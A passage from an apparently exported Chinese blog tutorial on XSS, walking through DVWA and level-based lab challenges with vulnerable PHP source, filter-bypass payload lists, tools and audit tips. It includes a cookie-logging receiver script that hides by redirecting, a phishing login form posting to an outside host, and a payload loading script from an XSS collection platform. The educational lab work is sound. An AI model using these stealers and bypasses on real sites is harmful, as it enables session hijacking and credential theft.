work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n\t// Sanitize name input\n\t$name = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n\t// Update database\n\t$query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n\t//mysql_close();\n}\n?>\n```\n\n截获数据并修改Message的值\n\n![image-20200831171424381](/images/XSS/image-20200831171424381.png)\n\n接收平台此时会收到Cookie值\n\n![image-20200831171401476](/images/XSS/image-20200831171401476.png)\n\n浏览器插件添加Cookie值并绕过登录\n\n![image-20200831173056272](/images/XSS/image-20200831173056272.png)\n\n接收Cookie的php文件\n\n```php+HTML\n<?php\n\n$cookie = $_GET['cookie']; //以GET方式获取cookie变量值\n$ip = getenv ('REMOTE_ADDR'); //远程主机IP地址\n$time=date('Y-m-d g:i:s'); //以“年-月-日 时：分：秒”的格式显示时间\n$referer=getenv ('HTTP_REFERER'); //链接来源\n$agent = $_SERVER['HTTP_USER_AGENT']; //用户浏览器类型\n\n$fp = fopen('cookie.txt', 'a'); //打开cookie.txt，若不存在则创建它\nfwrite($fp,\" IP: \" .$ip. \"\\n Date and Time: \" .$time. \"\\n User Agent:\".$agent.\"\\n Referer: \".$referer.\"\\n Cookie: \".$cookie.\"\\n\\n\\n\"); //写入文件\nfclose($fp); //关闭文件\n\nheader(\"Location: http://www.baidu.com\")//重定向到baidu，防止发现\n?>\n```\n\n直接访问生成cookie.txt文件\n\n![image-20200831183628978](/images/XSS/image-20200831183628978.png)\n\n###### DVWA-Medium\n\n中级和低级比较显示使用部分函数进行过滤。\n\n```php\naddslashes()\t\t\t\t使用反斜线引用字符串\nhtmlspecialchars()\t将特殊字符转换为 HTML 实体\nstr_replace()\t\t\t\t子字符串替换\n```\n\n![image-20200901112252053](/images/XSS/image-20200901112252053.png)\n\n抓包绕过\n\n```shell\n`<sc<script>ript>alert(/xss/)</script>`\n大小写绕过\n`<Script>alert(/xss/)</script>`\n`</textarea>'\"><Script src=https://webxss.top/xss/BjE4XZ?1598931992></script>`\n```\n\n弹窗检测\n\n![image-20200901134156567](/images/XSS/image-20200901134156567.png)\n\n![image-20200901134205736](/images/XSS/image-20200901134205736.png)\n\n```shell\n`<img src=1 οnerrοr=alert(1)>`\n```\n\n###### DVWA-high\n\n高和中比较发现采用正则表达式对script进行过滤了；但可尝试使用其他标签<img>等\n\n![image-20200901135011353](/images/XSS/image-20200901135011353.png)\n\n```html\n`<img src=1 onerror=alert(1)>`\n```\n\n![image-20200901140548264](/images/XSS/image-20200901140548264.png)\n\n![image-20200901140610422](/images/XSS/image-20200901140610422.png)\n\n#### DOM型\n\n##### DVWA-low\n\nlow版本不存在任何显示，default参数值设置为payload。\n\n```php+HTML\n<?php\n# No protections, anything goes\n?>\n```\n\n![image-20200901142115894](/images/XSS/image-20200901142115894.png)\n\n```shell\n`<option value=\"%3Cscript%3Ealert(%27xss%27)%3C/script%3E\"><script>alert('xss')</script>\n</option>`\n# script标签及值放在option标签内<dom树执行结果>\n```\n\n##### DVWA-Medium\n\n中级出现了对值<script进行判断\n\n```php+HTML\n<?php\n\n// Is there any input?\nif ( array_key_exists( \"default\", $_GET ) && !is_null ($_GET[ 'default' ]) ) {\n\t$default = $_GET['default'];\n\t\n\t# Do not allow script tags\n\tif (stripos ($default, \"<script\") !== false) {\n\t\theader (\"location: ?default=English\");\n\t\texit;\n\t}\n}\n?>\n```\n\n```shell\n# 此时使用`<img src=1 onerror=alert(1)>`\n# 如下图所示，发现我们的语句被插入到了value值中，并没有插入到option标签的值中，所以img标签并没有发起任何作用。\n```\n\n![image-20200901145238002](/images/XSS/image-20200901145238002.png)\n\n构造语句闭合option标签：\n\n```shell\n`></option><img src=1 onerror=alert(1)>`\n```\n\n![image-20200901145626304](/images/XSS/image-20200901145626304.png)\n\n\\> 被插入到了option标签的值中，因为</option>闭合了option标签，所以img标签并没有插入;构造语句去闭合select标签\n\n```shell\n# 完成标签闭合完成\n`></option></select><img src=1 onerror=alert('xss')>`\n```\n\n![image-20200901145826892](/images/XSS/image-20200901145826892.png)\n\n##### DVWA-High\n\n先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，语句就没有可能插入到页面中了。\n\n### Tools\n\n#### 黑盒测试\n\n##### AWVS\n\n![image-20200831112823669](/images/XSS/image-20200831112823669.png)\n\n一款自动化扫描工具，主要利用爬虫形式对整个网站进行爬取后再进行内部payload测试。这样就可以检测网站是否存在XSS漏洞等。\n\n目前最新版本已经AWVS 13支持Web端配置如上图所示\n\n##### BruteXSS\n\n[项目地址](https://github.com/rajeshmajumdar/BruteXSS.git)\n\n![image-20200831111313145](/images/XSS/image-20200831111313145.png)\n\nBruteXSS 是一个非常强大和快速的跨站点脚本检测工具，可用于暴力注入参数。BruteXSS 从指定的词库加载多种有效载荷进行注入，并且使用指定的载荷和扫描检查这些存在 XSS 漏洞的参数。得益于非常强大的扫描功能，在执行任务时，BruteXSS 非常准确而且极少误报。 BruteXSS 支持 POST 和 GET 请求，并适应现代 Web 应用程序。\n\n**特点**\n\n1. XSS 爆破\n2. XSS 扫描\n3. GET/POST 请求\n4. 可包含自定义单词\n5. 人性化的 UI\n\n其它工具自行搜索，不过基于以上工具可基本满足平时测试和复现；其他工具网络搜索即可。\n\n##### BeEF\n\nBeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。\n\n![logo](/images/XSS/logo.png)\n\n参考另一篇BeEF使用。\n\n#### 白盒测试\n\n关于XSS的代码审计主要就是从`接收参数`和`输出函数`及一些关键词入手。\n\nPHP中常见`接收参数`的方式有：`$_GET`、`$_POST`、`$_REQUEST`等等，\n\nPHP中常见`输出函数`的方式有：`print`，`print_r`，`echo`，`printf`，`sprintf`，`die`，`var_dump`，`var_export`\n\n可以搜索`接收参数`的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。\n\n也可以搜索`输出函数`这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。\n\n大多数程序会对接收参数封装在公共文件的函数中统一调用，就需要审计这些公共函数看有没有过滤，能否绕过等等。\n\nDOM型注入同样可以搜索一些JS操作DOM元素的关键词进行审计。\n\n### Bypass\n\n汇总部分绕过xss过滤方式，更多可搜“`XSS Filter Evasion Cheat Sheet_SecPulse`”一份专门介绍XSS的绕过。\n\n#### 大小写\n\n```shell\n`<ScRIpT>alert('XSS')</sCRIpT>`\n```\n\n#### 编码\n\n```shell\n1、十六进制编码\n2、jsfuck编码\n3、url编码\n4、unicode编码等\n5、`<0x736372697074>alert('123')</0x736372697074>`\n6、`<img src=\"1\" onerror=\"alert&#x28;1&#x29;\">`\n```\n\n#### magic_quotes_gpc\n\n```shell\n//绕过可参考以下\n`<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script>`\n```\n\n#### 标签\n\n##### 闭合\n\n```shell\n//查看源码输出位置是否存在标签未闭合情况来进行绕过\n`\"><script>alert(/123/)</script>`\n`</script><script>alert(1)</script>`\n```\n\n##### 其它标签\n\n```shell\n//使用较多方式是通过报错形式来添加标签进行绕过\n`<img src=\"x\" onerror=\"alert('XSS')\">`\n`<button onclick=\"javascript:alert('XSS')>XSS</button\">`\n`<title><img a=\"</title><img/src=1 onerror=alert(1)//\">`\n`\"onsubmit=javascript:alert(1)%20name=\"a`\n`<details open ontoggle=\"eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))\">`\n`<video src=\"http://www.0dutv.com/plug/down/up2.php/104678898.mp3\" onprogress=('body').perpend(123);('body')></video>`\n```\n\n#### 替换\n\n| 符号 | 替换     |\n| ---- | -------- |\n| %0a  | 替换空格 |\n| %d   | 替换空格 |\n| /**/ | 替换空格 |\n| %00  | 截断     |\n| ``   | 替换括号 |\n\n#### 重复绕过\n\n```shell\n//对部分字符过滤及替换时，采用重复形式进行绕过\n`<img ononerrorerror=\"123\">`\n`<script>alalertert(123)</script>`\n```\n\n#### 宽子节绕过\n\n`GB系列`编码，尝试宽字节字符：\n\n `%c0`、`%bf`、`%5c`、`%df`\n\n#### 事件属性\n\n| 属性        | 解析                           |\n| ----------- | ------------------------------ |\n| onclick     | 鼠标点击事件                   |\n| onerror     | 当加载文档或图像时发生某个错误 |\n| onload      | 某个页面或图像被完成加载       |\n| onmousemove | 鼠标被移动                     |\n| 等其它事件  |                                |\n\n#### 长度限制\n\ninput标签中有maxlength限制传参长度，抓包修改发送数据。\n\n#### PHP部分函数\n\nphp内包含部分过滤及转义函数及绕过方式统计\n\n| 序号 | PHP函数        | 函数解析                   | 绕过                                                         |\n| ---- | -------------- | -------------------------- | ------------------------------------------------------------ |\n| 1    | str_replace()  | 该函数区分大小写           | 使用大小写进行绕过                                           |\n| 2    | str_ireplace() | 该函数不区分大小写         | 双写绕过，如：<scscriptirpt>                                 |\n| 3    | preg_replace() | 正则表达式的搜索和替换     | 使用html标签事件绕过，如：`<img src=xx onerror=alert(1)>`    |\n| 4    | htmlentities() | 将字符转换为 HTML 转义字符 | htmlentities(string,quotestyle,character-set)函数的参数二，<br />默认情况下，是不对单引号进行编码的，仍可以用事件来触发XSS |\n\n### 修复建议\n\n不管是反射型、存储型还是DOM型XSS可对外部提交的参数进行过滤及转义操作将达到简单防护功效；\n\n<center>学习～</center>\n### 参考\n\n```html\n//反射型挑战解析\nhttps://my.oschina.net/u/4332632/blog/3374751\nhttps://www.cnblogs.com/bmjoker/p/9446472.html\nbypass姿势\nhttps://owasp.org/www-community/xss-filter-evasion-cheatsheet\nhttps://xz.aliyun.com/t/1678/\n```\n","source":"_posts/XSS学习.md","raw":"---\ntitle: XSS学习\ndate: 2020-09-05 20:26:23\ntags:\n - XSS\n---\n\n### 漏洞概述\n\nXSS：“Cross Site Scripting”：“跨站脚本攻击”，因和CSS（层叠样式表重名），因此被命名为XSS来表示\"跨站脚本攻击\"。\n\n之前说到，既然出现安全问题，必然是外部用户输入恶意字符串而产生的（又可称为：攻击者对参数、输入点可控，同时服务器端对输入的值未经过滤、转义，导致攻击事件发生。）整体的安全事件必然也均这样的经过，漏洞如何`验证`、`影响范围`及`修复`需要我们慢慢学习整理。\n\n#### 原理\n\n因浏览器本身设计缺陷，而浏览器的主要工作是对用户请求的HTML+CSS+Javascript的解释执行，其以前部分浏览器在安全性这块并未做任何验证，导致服务器端对外提供访问后一旦部署相应应用系统，且未对用户提交数据进行过滤将产生XSS攻击。\n\n本质是客户端代码注入攻击，代码类型基本属于前端类：HTML、Javascript、CSS等其他脚本组成。\n\n#### 产生过程\n\n##### 反射型(非持久性)\n\n1. 攻击者构造出特殊代码，其中包含恶意代码\n2. 用户打开带有恶意代码URL或网页，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器\n3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行；会进行弹窗告警\n\n##### 存储型(持久性)\n\n1. 攻击者准备好接收Cookie平台\n2. 攻击者找到目标系统可留言、修改个人信息处\n3. 插入恶意代码及链接\n4. 管理员登录系统并对留言信息点击后会触发XSS漏洞\n5. 会把管理员登录的Cookie发送到接收平台\n6. 攻击者替换Cookie值进行访问，此时权限会提升至管理员\n\n##### DOM型\n\n1. 攻击者构造Javascript或其他脚本\n2. 插入到指定位置(URL参数、其他个人信息或其他可修改位置)\n3. 点击触发漏洞，构造的恶意代码被执行\n4. 结果：可能会弹窗或其他操作\n\n#### 漏洞分类\n\n由以上了解，漏洞可按照以下形式进行分类：\n\n##### 一、非持久型(反射型、DOM型)\n\n指不会一直影响系统，只有每次点击访问后会触发浏览器执行对应恶意代码并作出响应。\n\n##### 二、持久型(存储型)\n\n指会一直留存于对应应用系统内，且如不删除操作会预留至系统内；一旦点击后会触发恶意代码，而且如不删除会每次点击都会触发。\n\n### 漏洞环境\n\n值得推荐的本地漏洞环境可参考如下：\n\n````\nDVWA:https://github.com/digininja/DVWA.git\n本地搭建XSS:https://zhuanlan.zhihu.com/p/54041627\nbwapp:http://www.itsecgames.com/\n其他环境待更新...\n````\n\n### 在线挑战\n\n值得推荐的线上挑战赛：\n\n```\nhttps://xz.aliyun.com/t/2296\nhttps://xss-quiz.int21h.jp/\n其他环境待更新...\n```\n\n### 影响范围\n\n按不同类型分析对目标系统会产生哪些影响范围\n\n#### 反射型\n\nCookie欺骗/Cookie会话攻击（提前搭建接收Cookie文件）\n\nXSS History Hack(利用：getComputedStyle()方法)\n\n#### 存储型\n\nCookie欺骗/Cookie会话攻击\n\n会话劫持(Session/Cookie)\n\n网络钓鱼\n\n钓鱼脚本\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>login</title>\n</head>\n<body>\n    <form method=\"POST\" action=\"http://xss-lab.me:8888/get.php\">\n        <input type=\"text\" name=\"username\" value=\"test\"/><br>\n        <input type=\"password\" name=\"password\" value=\"Pass\"/><br>\n        <input type=\"submit\" name=\"login\" value=\"Submit\">\n    </form>\n</body>\n</html>\n```\n\n记录信息\n\n```php\n<?php\n$data =fopen('login.txt',\"a+\");\n$login = $_POST[\"username\"];\n$pass = $_POST[\"password\"];\nfwrite($data,\"username:$login\\n\");\nfwrite($data,\"password:$pass\\n\");\nfclose($data);\nHeader(\"location:login.html\");\n?>\n```\n\n下图记录用户提交请求\n\n![image-20200828105754440](/images/XSS/image-20200828105754440.png)\n\n网页挂马(网页内嵌入script、或iframe等标签)\n\nDOS或DDOS\n\n#### DOM型\n\nDOM型和反射型XSS类似因此不再重复写\n\n### 实战验证\n\n#### 反射型\n\n反射型XSS使用网络检索得到一款源码搭建本地测试，反射型`payload`\n\n##### 挑战一\n\n```shell\n//未编码\n`<script>alert('xss')</script>`\n```\n\n```shell\n<?php \nini_set(\"display_errors\", 0);\n//外部输入变量\n$str = $_GET[\"name\"];\n//变量值未经过滤直接输出\necho \"<h2 align=center>欢迎用户\".$str.\"</h2>\";\n?>\n<center><img src=level1.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n```\n\n`Result`\n\n![image-20200828134439412](/images/XSS/image-20200828134439412.png)\n\n##### 挑战二\n\n```shell\n//初步测试,发现payload直接输出\n`<script>alert('xss')</script>`\n```\n\n![image-20200828140956492](/images/XSS/image-20200828140956492.png)\n\n```shell\n//满足闭合,观察输入payload时输出\n`\"><script>alert('xss')</script>`\n```\n\n```shell\n//对变量经过htmlspecialchars函数过滤\n<?php \nini_et(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level2.php method=GET>\n<input name=keyword  value=\"'.$str.'\">\n<input type=submit name=submit value=\"搜索\"/>\n</form>\n</center>';\n?>\n<center><img src=level2.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str).\"</h3>\";\n?>\n```\n\n`Result`\n\n![image-20200828140717307](/images/XSS/image-20200828140717307.png)\n\n##### 挑战三\n\n```shell\n//闭合测试，发现>被转义了\n`><script>alert('xss')</script>`\n```\n\n![image-20200828142634784](/images/XSS/image-20200828142634784.png)\n\n```shell\n//不使用<等类似字符进行测试\n`'onmouseover=alert(1)//`\n```\n\n```shell\n//对变量经过两次htmlspecialchars函数过滤\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".\"<center>\n<form action=level3.php method=GET>\n<input name=keyword  value='\".htmlspecialchars($str).\"'>\n<input type=submit name=submit value=搜索 />\n</form>\n</center>\";\n?>\n```\n\n`Result`\n\n![image-20200828143012943](/images/XSS/image-20200828143012943.png)\n\n##### 挑战四\n\n```shell\n//基础测试，发现对<、>进行替换为空\n`\"><script>alert('xss')</script>`\n```\n\n![image-20200828143756092](/images/XSS/image-20200828143756092.png)\n\n```shell\n//不使用<等类似字符进行测试\n`\"onmouseover=alert(1)//`\n```\n\n```php+HTML\n//对输入变量值中<、>进行替换\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\">\",\"\",$str);\n$str3=str_replace(\"<\",\"\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level4.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n`Result`\n\n![image-20200828144232008](/images/XSS/image-20200828144232008.png)\n\n##### 挑战五\n\n```shell\n//基础测试，发现对<、>进行替换为空\n`\"><script>alert('xss')</script>`\n```\n\n![image-20200828150406623](/images/XSS/image-20200828150406623.png)\n\n```php+HTML\n//<script 转换成 <scr_ipt ，on转换成 o_n\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n```shell\n//使用伪协议绕过\n`\"> <a href=\"javascript:alert(1)\">click</a>`\n```\n\n`Result`\n\n![image-20200828151240091](/images/XSS/image-20200828151240091.png)\n\n##### 挑战六\n\n```shell\n//使用伪协议绕过\n`\"> <a href=\"javascript:alert(1)\">click</a>`\n```\n\n![image-20200828151906636](/images/XSS/image-20200828151906636.png)\n\n````php+HTML\n//发现添加了多个属性进行过滤操作\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level6.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n````\n\n```shell\n//发现并未对大小写过滤，\n`\"> <a HrEf=\"javascript:alert(1)\">click</a>`\n```\n\n`Result`\n\n![image-20200828152455501](/images/XSS/image-20200828152455501.png)\n\n##### 挑战七\n\n```shell\n//使用大小写测试\n`\"> <a HrEf=\"javascript:alert(1)\">click</a>`\n```\n\n![image-20200828152734820](/images/XSS/image-20200828152734820.png)\n\n```php+HTML\n//添加script替换为空\n<?php \nini_set(\"display_errors\", 0);\n$str =strtolower( $_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"\",$str);\n$str3=str_replace(\"on\",\"\",$str2);\n$str4=str_replace(\"src\",\"\",$str3);\n$str5=str_replace(\"data\",\"\",$str4);\n$str6=str_replace(\"href\",\"\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level7.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n\n```shell\n//重复绕过,\n`\"><sscriptcript>alert(1)</sscriptcript>`\n`\"oonnmouseover=alert(1)`\n`\"><a hrhrefef=javascriscriptpt:alert(1)>click</a>`\n```\n\n`Result`\n\n![image-20200828153152250](/images/XSS/image-20200828153152250.png)\n\n##### 挑战八\n\n````shell\n//重复测试\n`\"><sscriptcript>alert(1)</sscriptcript>`\n````\n\n![image-20200828153930815](/images/XSS/image-20200828153930815.png)\n\n```php+HTML\n//在上面基础上添加了大小写过滤、属性中双引号被转换成HTML实体，无法截断属性，可以使用协议绕过javascript:alert，由于script关键字被过滤，\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level8.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n```\n\n[在线实体编码](https://www.qqxiuzi.cn/bianma/zifushiti.php)\n\n```shell\n//实体编码，javascript会被替换成javasc_rpt，我们使用&#x72来代替r ,HTML字符实体转换：\n`javascrip&#x74;:alert(1)`\n`javascript:%61lert(1)`\n`javasc&#x72;ipt:alert`1``\n`javasc&#x0072;ipt:alert`1``\n```\n\n`Result`\n\n![image-20200828154518631](/images/XSS/image-20200828154518631.png)\n\n##### 挑战九\n\n```shell\n//实体编码测试\n`javascrip&#x74;:alert(1)`\n```\n\n![image-20200828154756855](/images/XSS/image-20200828154756855.png)\n\n```php+HTML\n//在之前基础上，添加的链接是http://头信息\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level9.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=添加友情链接 />\n</form>\n</center>';\n?>\n<?php\nif(false===strpos($str7,'http://'))\n{\n  echo '<center><BR><a href=\"您的链接不合法？有没有！\">友情链接</a></center>';\n        }\nelse\n{\n  echo '<center><BR><a href=\"'.$str7.'\">友情链接</a></center>';\n}\n?>\n```\n\n```shell\n//添加http://信息\n`javascrip&#x74;:alert(1)//http://xxx.com ` //利用注释\n`javascrip&#x74;:%0dhttp://xxx.com%0dalert(1) ` //不利用注释\n`javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)`  //不利用注释\n```\n\n`Result`\n\n![image-20200828155322234](/images/XSS/image-20200828155322234.png)\n\n##### 挑战十\n\n发现一个隐藏输入框\n\n![image-20200828155806918](/images/XSS/image-20200828155806918.png)\n\n```php+HTML\n//多了个参数、多了一个输入框且已经隐藏、并对<、>括号进行过滤，htmlspecialchars函数过滤\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str11 = $_GET[\"t_sort\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n```shell\n//添加参数并构造PoC\n`keyword = test&t_sort=\"type=\"text\" onclick = \"alert(1)`\n`keyword = test&t_sort=\"type=\"text\" onmouseover=\"alert(1)`\n`keyword = test&t_sort=\"type=\"text\" onmouseover=alert`1``\n```\n\n`Result`\n\n![image-20200828160245970](/images/XSS/image-20200828160245970.png)\n\n##### 挑战十一\n\n之前测试发现无效果，查看源码\n\n```javascript\n//比之前多了个请求头REFERER进行指定来源\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_REFERER'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ref\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n````shell\n//修改请求头并修改一下PoC代码\n`Referer: \" onmouseover=alert(1) type=\"text\"`\n`Referer: \" onclick=\"alert(1) type=\"text\"`\n````\n\n![image-20200828161500548](/images/XSS/image-20200828161500548.png)\n\n`Result`\n\n![image-20200828161534239](/images/XSS/image-20200828161534239.png)\n\n##### 挑战十二\n\n```javascript\n//不再是REFERER请求头，现在更换了User-agent\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_USER_AGENT'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ua\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n````shell\n//修改User-agent插入PoC\n`User-Agent: \" onmouseover=alert(1) type=\"text\"`\n`User-Agent: \" onclick=\"alert(1) type=\"text\"`\n````\n\n![image-20200828162042253](/images/XSS/image-20200828162042253.png)\n\n`Result`\n\n![image-20200828162112961](/images/XSS/image-20200828162112961.png)\n\n##### 挑战十三\n\n```php+HTML\n//修改请求头Cookie来测试\n<?php \nsetcookie(\"user\", \"call me maybe?\", time()+3600);\nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_COOKIE[\"user\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_cook\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n\n```shell\n//修改Cookie\n`Cookie: user=call+me+maybe%3F\" onmouseover=alert(1) type=\"text\"`\n`Cookie: user=call+me+maybe%3F\" onclick=\"alert(1) type=\"text\"`\n```\n\n![image-20200828162907084](/images/XSS/image-20200828162907084.png)\n\n`Result`\n\n![image-20200828162927276](/images/XSS/image-20200828162927276.png)\n\n##### 挑战十四\n\n网路搜索：\n\n`此题主要利用exif xss，链接由于网络的原因无法访问，exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，可利用exiftool工具，命令如下：`\n\n```shell\n//但是因为域名无法访问了，这题后期再更\n`exiftool -FIELD=XSS FILENAME`\n`exiftool -Artist=' \"><img src=1 onerror=alert(document.domain)>' filename.jpeg`\n```\n\n##### 挑战十五\n\n```php+HTML\n//ng-include是AngularJS中指令，具有文件包含功能\"<div ng-include=\"'myFile.htm'\"></div>\n\"，和php中include函数类似。可通过src属性来加载以上是挑战任意一个。\n//这里需要注意，其中远程加载google的js，需要\"扶梯子\"才行。\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"src\"];\necho '<body><span class=\"ng-include:'.htmlspecialchars($str).'\"></span></body>';\n?>\n```\n\n```shell\n//这里包含挑战二来实现XSS\n`/level15.php?src='level2.php?keyword=\"><img src=x onerror=alert(1)>'`\n```\n\n`Result`\n\n![image-20200828200852458](/images/XSS/image-20200828200852458.png)\n\n##### 挑战十六\n\n```php+HTML\n//对变量的值进行script、/、空格等替换&nbsp，用%0d，%0a等绕过\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"&nbsp;\",$str);\n$str3=str_replace(\" \",\"&nbsp;\",$str2);\n$str4=str_replace(\"/\",\"&nbsp;\",$str3);\n$str5=str_replace(\"\t\",\"&nbsp;\",$str4);\necho \"<center>\".$str5.\"</center>\";\n?>\n<center><img src=level16.png></center>\n<?php \necho \"<h3 align=center>payload的长度:\".strlen($str5).\"</h3>\";\n?>\n```\n\n```shell\n//对字符进行编码\n`<img%0dsrc=1%0donerror=alert(16)>`\n`<iframe%0dsrc=0%0donmouseover=alert｀16｀></iframe>`\n`<svg%0aonload=alert｀16｀></svg>`\n```\n\n`Result`\n\n![image-20200828203522683](/images/XSS/image-20200828203522683.png)\n\n##### 